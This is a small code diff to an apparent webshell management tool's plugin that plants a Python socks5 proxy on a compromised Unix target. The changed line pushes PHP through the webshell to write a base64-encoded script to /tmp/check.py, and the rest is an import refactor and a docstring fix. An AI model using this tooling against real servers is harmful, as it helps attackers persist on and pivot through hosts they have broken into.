@@ -1,8 +1,7 @@
 from libs.config import alias, color
-from libs.myapp import send, delay_send, is_windows, has_env, get_system_code
+from libs.myapp import send, delay_send, is_windows, has_env, get_system_code, base64_encode
 from threading import Thread
 from time import sleep
-from base64 import b64encode
 
 
 def get_python(port):
@@ -97,7 +96,7 @@ def run(port: int = 8888):
 
     (Only for *unix) Run a socks5 server on the target system by python.
 
-    eg: bindshell {port=8888}
+    eg: socks {port=8888}
     """
     if (is_windows()):
         return
@@ -105,7 +104,7 @@ def run(port: int = 8888):
     if flag:
         python = get_python(port)
         pyname = "check.py"
-        res = send(f"print(file_put_contents('/tmp/{pyname}', base64_decode(\"{b64encode(python.encode()).decode()}\")));")
+        res = send(f"print(file_put_contents('/tmp/{pyname}', base64_decode(\"{base64_encode(python)}\")));")
         if (not res):
             return
         text = res.r_text.strip()
